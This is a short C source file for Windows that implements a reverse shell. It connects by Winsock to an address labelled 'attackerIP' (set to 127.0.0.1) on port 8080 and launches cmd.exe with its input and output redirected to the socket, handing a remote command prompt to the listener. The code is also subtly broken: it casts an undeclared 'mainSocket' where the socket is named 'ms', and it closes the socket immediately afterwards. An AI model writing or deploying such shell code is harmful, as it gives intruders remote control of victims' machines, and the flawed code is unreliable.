#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

WSADATA wsaData;
SOCKET ms;
struct sockaddr_in serverAddr;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

const char *attackerIP = "127.0.0.1";
short attackerPort = 8080;

int main(void)
{
  WSAStartup(MAKEWORD(2, 2), &wsaData);
  ms = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (ms == INVALID_SOCKET)
  {
    printf("Socket creation failed with error: %d\n", WSAGetLastError());
    return 1;
  }
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(attackerPort);
  serverAddr.sin_addr.s_addr = inet_addr(attackerIP);
  if (connect(ms, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
  {
    printf("Connection failed with error: %d\n", WSAGetLastError());
    closesocket(ms);
    WSACleanup();
    return 1;
  }
  printf("Connected to %s:%d\n", attackerIP, attackerPort);
  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)mainSocket;
  CreateProcess(
      NULL,
      (LPSTR) "C:\\Windows\\System32\\cmd.exe",
      NULL,
      NULL,
      TRUE,
      0,
      NULL,
      NULL,
      &startupInfo,
      &processInfo);
  // Additional code to handle communication can be added here
  closesocket(ms);
  WSACleanup();
  return 0;
}